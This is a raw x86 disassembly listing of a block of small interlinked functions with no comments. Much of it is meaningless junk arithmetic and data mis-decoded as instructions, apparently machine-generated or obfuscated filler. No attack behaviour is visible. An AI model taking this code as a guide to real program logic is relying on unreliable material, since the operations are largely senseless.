  4d1095:	push   edx
  4d1096:	push   esi
  4d1097:	push   DWORD PTR [edx+0x19c]
  4d109d:	push   DWORD PTR [edx+0x5c]
  4d10a0:	call   0x4d11b0
  4d10a5:	add    esp,0xc
  4d10a8:	pop    edx
  4d10a9:	push   edx
  4d10aa:	lea    edx,[edx-0x74]
  4d10ad:	push   edx
  4d10ae:	call   0x4d10cc
  4d10b3:	add    esp,0x4
  4d10b6:	test   eax,eax
  4d10b8:	jne    0x4d10aa
  4d10ba:	pop    edx
  4d10bb:	add    esp,0x3c
  4d10be:	pop    ebp
  4d10bf:	ret    
  4d10c0:	pop    edi
  4d10c1:	call   DWORD PTR ds:0x4d205c
  4d10c7:	call   edi
  4d10c9:	add    BYTE PTR [eax],al
  4d10cb:	add    BYTE PTR [edi-0x1],bl
  4d10ce:	adc    eax,0x4d2014
  4d10d3:	call   edi
  4d10d5:	add    BYTE PTR [eax],al
  4d10d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10dd:	sub    esp,0x24
  4d10e0:	mov    esi,0x4d315c
  4d10e5:	mov    DWORD PTR [esi-0xc8],esi
  4d10eb:	push   esi
  4d10ec:	push   DWORD PTR [esi+0x5c]
  4d10ef:	push   edx
  4d10f0:	call   0x4d0868
  4d10f5:	add    esp,0x8
  4d10f8:	pop    esi
  4d10f9:	mov    edx,0x0
  4d10fe:	push   edx
  4d10ff:	call   0x4d0e38
  4d1104:	add    esp,0x4
  4d1107:	push   0x0
  4d1109:	call   0x4d0a0c
  4d110e:	add    esp,0x4
  4d1111:	add    esp,0x24
  4d1114:	pop    ebp
  4d1115:	ret    
  4d1116:	add    BYTE PTR [eax],al
  4d1118:	mov    edi,edi
  4d111a:	push   ebp
  4d111b:	mov    ebp,esp
  4d111d:	sub    esp,0x4c
  4d1120:	lea    eax,ds:0x4d3020
  4d1126:	adc    DWORD PTR [ebp-0x34],0x5a
  4d112a:	push   eax
  4d112b:	push   DWORD PTR [eax+0x1e8]
  4d1131:	push   esi
  4d1132:	push   edx
  4d1133:	call   0x4d1078
  4d1138:	add    esp,0xc
  4d113b:	pop    eax
  4d113c:	push   eax
  4d113d:	mov    ebx,0x0
  4d1142:	push   ebx
  4d1143:	call   0x4d0d48
  4d1148:	add    esp,0x4
  4d114b:	pop    eax
  4d114c:	push   eax
  4d114d:	mov    esi,0x0
  4d1152:	push   esi
  4d1153:	call   0x4d08fc
  4d1158:	add    esp,0x4
  4d115b:	pop    eax
  4d115c:	add    esp,0x4c
  4d115f:	pop    ebp
  4d1160:	ret    
  4d1161:	add    BYTE PTR [eax],al
  4d1163:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1169:	sub    esp,0x3c
  4d116c:	mov    eax,0x4d306c
  4d1171:	sub    edi,0x7b4e
  4d1177:	push   eax
  4d1178:	push   edi
  4d1179:	push   DWORD PTR [eax+0x1b8]
  4d117f:	push   DWORD PTR [eax+0x1ac]
  4d1185:	call   0x4d0dac
  4d118a:	add    esp,0xc
  4d118d:	pop    eax
  4d118e:	push   eax
  4d118f:	push   0x0
  4d1191:	call   0x4d0d48
  4d1196:	add    esp,0x4
  4d1199:	pop    eax
  4d119a:	push   eax
  4d119b:	mov    ebx,0x0
  4d11a0:	push   ebx
  4d11a1:	call   0x4d0a60
  4d11a6:	add    esp,0x4
  4d11a9:	pop    eax
  4d11aa:	add    esp,0x3c
  4d11ad:	pop    ebp
  4d11ae:	ret    
  4d11af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11b5:	sub    esp,0x28
  4d11b8:	lea    edi,ds:0x4d31d0
  4d11be:	xor    edx,0x15
  4d11c1:	push   edi
  4d11c2:	push   ecx
  4d11c3:	push   eax
  4d11c4:	call   0x4d0ca0
  4d11c9:	add    esp,0x8
  4d11cc:	pop    edi
  4d11cd:	push   edi
  4d11ce:	push   0x0
  4d11d0:	call   0x4d106c
  4d11d5:	add    esp,0x4
  4d11d8:	pop    edi
  4d11d9:	push   edi
  4d11da:	mov    edi,0x0
  4d11df:	push   edi
  4d11e0:	call   0x4d106c
  4d11e5:	add    esp,0x4
  4d11e8:	pop    edi
  4d11e9:	add    esp,0x28
  4d11ec:	pop    ebp
  4d11ed:	ret    
  4d11ee:	add    BYTE PTR [eax],al
  4d11f0:	mov    edi,edi
  4d11f2:	push   ebp
  4d11f3:	mov    ebp,esp
  4d11f5:	sub    esp,0x40
  4d11f8:	mov    eax,0x4d30ac
  4d11fd:	xor    DWORD PTR [ebp-0x30],0x63
  4d1201:	push   eax
  4d1202:	push   0x0
  4d1204:	call   0x4d156c
  4d1209:	add    esp,0x4
  4d120c:	pop    eax
  4d120d:	push   eax
  4d120e:	push   DWORD PTR [eax+0x1f4]
  4d1214:	push   DWORD PTR [eax+0x10]
  4d1217:	push   DWORD PTR [eax+0x18]
  4d121a:	call   0x4d13b0
  4d121f:	add    esp,0xc
  4d1222:	pop    eax
  4d1223:	push   eax
  4d1224:	mov    esi,0x0
  4d1229:	push   esi
  4d122a:	call   0x4d156c
  4d122f:	add    esp,0x4
  4d1232:	pop    eax
  4d1233:	add    esp,0x40
  4d1236:	pop    ebp
  4d1237:	ret    
  4d1238:	mov    edi,edi
  4d123a:	push   ebp
  4d123b:	mov    ebp,esp
  4d123d:	sub    esp,0x2c
  4d1240:	lea    ecx,ds:0x4d30b8
  4d1246:	sbb    edx,0x47
  4d1249:	push   ecx
  4d124a:	mov    eax,0x0
  4d124f:	push   eax
  4d1250:	call   0x4d106c
  4d1255:	add    esp,0x4
  4d1258:	pop    ecx
  4d1259:	push   ecx
  4d125a:	push   DWORD PTR [ecx+0x198]
  4d1260:	push   edx
  4d1261:	push   edx
  4d1262:	call   0x4d12ec
  4d1267:	add    esp,0xc
  4d126a:	pop    ecx
  4d126b:	push   ecx
  4d126c:	mov    ebx,0x0
  4d1271:	push   ebx
  4d1272:	call   0x4d0d48
  4d1277:	add    esp,0x4
  4d127a:	pop    ecx
  4d127b:	add    esp,0x2c
  4d127e:	pop    ebp
  4d127f:	ret    
  4d1280:	pop    edi
  4d1281:	call   DWORD PTR ds:0x4d209c
  4d1287:	call   edi
  4d1289:	add    BYTE PTR [eax],al
  4d128b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1291:	sub    esp,0x48
  4d1294:	lea    eax,[edx-0xa8]
  4d129a:	add    DWORD PTR [ebp-0x20],0xffffe8b2
  4d12a1:	push   eax
  4d12a2:	mov    eax,0x0
  4d12a7:	push   eax
  4d12a8:	call   0x4d0ce0
  4d12ad:	add    esp,0x4
  4d12b0:	pop    eax
  4d12b1:	push   eax
  4d12b2:	push   DWORD PTR [eax+0x1d8]
  4d12b8:	push   ebx
  4d12b9:	call   0x4d1238
  4d12be:	add    esp,0x8
  4d12c1:	pop    eax
  4d12c2:	push   eax
  4d12c3:	push   0x0
  4d12c5:	call   0x4d0a60
  4d12ca:	add    esp,0x4
  4d12cd:	pop    eax
  4d12ce:	add    esp,0x48
  4d12d1:	pop    ebp
  4d12d2:	ret    
  4d12d3:	add    BYTE PTR [edi-0x1],bl
  4d12d6:	adc    eax,0x4d2000
  4d12db:	call   edi
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [edi-0x1],bl
  4d12e2:	adc    eax,0x4d2098
  4d12e7:	call   edi
  4d12e9:	add    BYTE PTR [eax],al
  4d12eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12f1:	sub    esp,0x20
  4d12f4:	lea    eax,ds:0x4d3188
  4d12fa:	sbb    DWORD PTR [eax+0x5c],ebx
  4d12fd:	push   eax
  4d12fe:	push   0x0
  4d1300:	call   0x4d0b1c
  4d1305:	add    esp,0x4
  4d1308:	pop    eax
  4d1309:	push   eax
  4d130a:	push   ecx
  4d130b:	push   DWORD PTR [eax+0x10c]
  4d1311:	call   0x4d132c
  4d1316:	add    esp,0x8
  4d1319:	pop    eax
  4d131a:	push   eax
  4d131b:	push   0x0
  4d131d:	call   0x4d156c
  4d1322:	add    esp,0x4
  4d1325:	pop    eax
  4d1326:	add    esp,0x20
  4d1329:	pop    ebp
  4d132a:	ret    
  4d132b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1331:	sub    esp,0x50
  4d1334:	lea    esi,ds:0x4d31a4
  4d133a:	sbb    edi,DWORD PTR [ebp-0x38]
  4d133d:	push   esi
  4d133e:	push   DWORD PTR [esi+0xe8]
  4d1344:	push   edx
  4d1345:	push   ebx
  4d1346:	push   edx
  4d1347:	call   0x4d0cec
  4d134c:	add    esp,0x10
  4d134f:	pop    esi
  4d1350:	push   0x0
  4d1352:	call   0x4d0e38
  4d1357:	add    esp,0x4
  4d135a:	push   0x0
  4d135c:	call   0x4d0b1c
  4d1361:	add    esp,0x4
  4d1364:	add    esp,0x50
  4d1367:	pop    ebp
  4d1368:	ret    
  4d1369:	add    BYTE PTR [eax],al
  4d136b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1371:	sub    esp,0x24
  4d1374:	lea    edx,[eax-0x1a8]
  4d137a:	add    esi,DWORD PTR [ebp-0x1c]
  4d137d:	push   edx
  4d137e:	push   DWORD PTR [edx+0x110]
  4d1384:	push   ecx
  4d1385:	push   eax
  4d1386:	call   0x4d0a6c
  4d138b:	add    esp,0xc
  4d138e:	pop    edx
  4d138f:	push   edx
  4d1390:	mov    esi,0x0
  4d1395:	push   esi
  4d1396:	call   0x4d0b28
  4d139b:	add    esp,0x4
  4d139e:	pop    edx
  4d139f:	push   edx
  4d13a0:	push   0x0
  4d13a2:	call   0x4d0ce0
  4d13a7:	add    esp,0x4
  4d13aa:	pop    edx
  4d13ab:	add    esp,0x24
  4d13ae:	pop    ebp
  4d13af:	ret    
  4d13b0:	mov    edi,edi
  4d13b2:	push   ebp
  4d13b3:	mov    ebp,esp
  4d13b5:	sub    esp,0x1c
  4d13b8:	lea    edx,[eax+0x3c]
  4d13bb:	cmp    edx,0x3fa9
  4d13c1:	jb     0x4d13b3
  4d13c3:	push   edx
  4d13c4:	call   0x4d0c94
  4d13c9:	add    esp,0x4
  4d13cc:	pop    edx
  4d13cd:	push   edx
  4d13ce:	push   ecx
  4d13cf:	push   esi
  4d13d0:	push   DWORD PTR [edx+0x118]
  4d13d6:	call   0x4d1494
  4d13db:	add    esp,0xc
  4d13de:	pop    edx
  4d13df:	push   edx
  4d13e0:	push   0x0
  4d13e2:	call   0x4d156c
  4d13e7:	add    esp,0x4
  4d13ea:	pop    edx
  4d13eb:	add    esp,0x1c
  4d13ee:	pop    ebp
  4d13ef:	ret    
  4d13f0:	mov    edi,edi
  4d13f2:	push   ebp
  4d13f3:	mov    ebp,esp
  4d13f5:	sub    esp,0x20
  4d13f8:	lea    eax,[edx-0x4]
  4d13fb:	and    DWORD PTR [eax+0x158],edi
  4d1401:	push   eax
  4d1402:	mov    ebx,0x0
  4d1407:	push   ebx
  4d1408:	call   0x4d156c
  4d140d:	add    esp,0x4
  4d1410:	pop    eax
  4d1411:	push   eax
  4d1412:	push   DWORD PTR [eax+0x44]
  4d1415:	push   esi
  4d1416:	call   0x4d0b40
  4d141b:	add    esp,0x8
  4d141e:	pop    eax
  4d141f:	push   eax
  4d1420:	push   0x0
  4d1422:	call   0x4d0b28
  4d1427:	add    esp,0x4
  4d142a:	pop    eax
  4d142b:	add    esp,0x20
  4d142e:	pop    ebp
  4d142f:	ret    
  4d1430:	pop    edi
  4d1431:	call   DWORD PTR ds:0x4d204c
  4d1437:	call   edi
  4d1439:	add    BYTE PTR [eax],al
  4d143b:	add    BYTE PTR [edi-0x1],bl
  4d143e:	adc    eax,0x4d206c
  4d1443:	call   edi
  4d1445:	add    BYTE PTR [eax],al
  4d1447:	add    BYTE PTR [edi-0x1],bl
  4d144a:	adc    eax,0x4d2010
  4d144f:	call   edi
  4d1451:	add    BYTE PTR [eax],al
  4d1453:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1459:	sub    esp,0x28
  4d145c:	lea    eax,[edx+0x54]
  4d145f:	and    ecx,DWORD PTR [eax-0x140]
  4d1465:	push   eax
  4d1466:	push   edi
  4d1467:	push   DWORD PTR [eax+0x154]
  4d146d:	push   DWORD PTR [eax+0x8]
  4d1470:	call   0x4d136c
  4d1475:	add    esp,0xc
  4d1478:	pop    eax
  4d1479:	push   eax
  4d147a:	push   0x0
  4d147c:	call   0x4d106c
  4d1481:	add    esp,0x4
  4d1484:	pop    eax
  4d1485:	push   eax
  4d1486:	call   0x4d1430
  4d148b:	add    esp,0x4
  4d148e:	pop    eax
  4d148f:	add    esp,0x28
  4d1492:	pop    ebp
  4d1493:	ret    
  4d1494:	mov    edi,edi
  4d1496:	push   ebp
  4d1497:	mov    ebp,esp
  4d1499:	sub    esp,0x1c
  4d149c:	lea    eax,[edx-0x14]
  4d149f:	add    esi,DWORD PTR [eax-0x7c]
  4d14a2:	push   eax
  4d14a3:	push   DWORD PTR [eax+0x11c]
  4d14a9:	push   DWORD PTR [eax+0xac]
  4d14af:	call   0x4d0b84
  4d14b4:	add    esp,0x8
  4d14b7:	pop    eax
  4d14b8:	push   eax
  4d14b9:	mov    edx,0xfffffff4
  4d14be:	push   edx
  4d14bf:	call   0x4d09b8
  4d14c4:	add    esp,0x4
  4d14c7:	pop    eax
  4d14c8:	push   eax
  4d14c9:	mov    edi,0x0
  4d14ce:	push   edi
  4d14cf:	call   0x4d08fc
  4d14d4:	add    esp,0x4
  4d14d7:	pop    eax
  4d14d8:	add    esp,0x1c
  4d14db:	pop    ebp
  4d14dc:	ret    
  4d14dd:	add    BYTE PTR [eax],al
  4d14df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14e5:	sub    esp,0x38
  4d14e8:	lea    ecx,ds:0x4d30a8
  4d14ee:	add    DWORD PTR [ebp-0x8],0x9
  4d14f2:	push   ecx
  4d14f3:	push   0x0
  4d14f5:	call   0x4d08fc
  4d14fa:	add    esp,0x4
  4d14fd:	pop    ecx
  4d14fe:	push   ecx
  4d14ff:	push   DWORD PTR [ecx+0x1dc]
  4d1505:	push   edx
  4d1506:	push   edx
  4d1507:	call   0x4d07d8
  4d150c:	add    esp,0xc
  4d150f:	pop    ecx
  4d1510:	push   ecx
  4d1511:	lea    edx,[ecx-0xa8]
  4d1517:	push   edx
  4d1518:	call   0x4d10cc
  4d151d:	add    esp,0x4
  4d1520:	test   eax,eax
  4d1522:	jne    0x4d1511
  4d1524:	pop    ecx
  4d1525:	add    esp,0x38
  4d1528:	pop    ebp
  4d1529:	ret    
  4d152a:	add    BYTE PTR [eax],al
  4d152c:	mov    edi,edi
  4d152e:	push   ebp
  4d152f:	mov    ebp,esp
  4d1531:	sub    esp,0x20
  4d1534:	lea    eax,[edx-0x11c]
  4d153a:	sub    ecx,DWORD PTR [ebp-0x14]
  4d153d:	push   eax
  4d153e:	push   edx
  4d153f:	push   DWORD PTR [eax+0x48]
  4d1542:	push   ecx
  4d1543:	push   DWORD PTR [eax+0x18c]
  4d1549:	call   0x4d0df4
  4d154e:	add    esp,0x10
  4d1551:	pop    eax
  4d1552:	push   eax
  4d1553:	call   0x4d1430
  4d1558:	add    esp,0x4
  4d155b:	pop    eax
  4d155c:	push   eax
  4d155d:	call   0x4d0c94
  4d1562:	add    esp,0x4
  4d1565:	pop    eax
  4d1566:	add    esp,0x20
  4d1569:	pop    ebp
  4d156a:	ret    
  4d156b:	add    BYTE PTR [edi-0x1],bl
  4d156e:	adc    eax,0x4d2040
  4d1573:	call   edi
  4d1575:	add    BYTE PTR [eax],al
  4d1577:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d157d:	sub    esp,0x34
  4d1580:	mov    edx,0x4d30b0
  4d1585:	xor    DWORD PTR [edx-0x70],0x28de
  4d158c:	push   edx
  4d158d:	push   ecx
  4d158e:	push   DWORD PTR [edx+0x50]
  4d1591:	call   0x4d128c
  4d1596:	add    esp,0x8
  4d1599:	pop    edx
  4d159a:	push   edx
  4d159b:	mov    edx,0xfffffff4
  4d15a0:	push   edx
  4d15a1:	call   0x4d09b8
  4d15a6:	add    esp,0x4
  4d15a9:	pop    edx
  4d15aa:	push   edx
  4d15ab:	lea    ecx,[edx-0xb0]
  4d15b1:	push   ecx
  4d15b2:	call   0x4d10cc
  4d15b7:	add    esp,0x4
  4d15ba:	test   eax,eax
  4d15bc:	jne    0x4d15ab
  4d15be:	pop    edx
  4d15bf:	add    esp,0x34
  4d15c2:	pop    ebp
  4d15c3:	ret    
  4d15c4:	pop    edi
  4d15c5:	call   DWORD PTR ds:0x4d2094
  4d15cb:	call   edi
  4d15cd:	add    BYTE PTR [eax],al
	...
